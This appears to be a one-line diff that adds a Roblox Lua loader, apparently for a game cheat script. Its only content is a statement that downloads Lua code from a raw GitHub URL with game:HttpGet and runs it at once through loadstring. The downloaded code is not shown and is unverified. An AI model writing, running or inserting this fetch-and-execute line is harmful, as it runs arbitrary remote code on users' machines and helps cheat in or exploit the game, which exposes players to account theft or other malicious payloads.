@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Krnow1/Outlawbaldeball/main/LegitOUTLAW'))("")
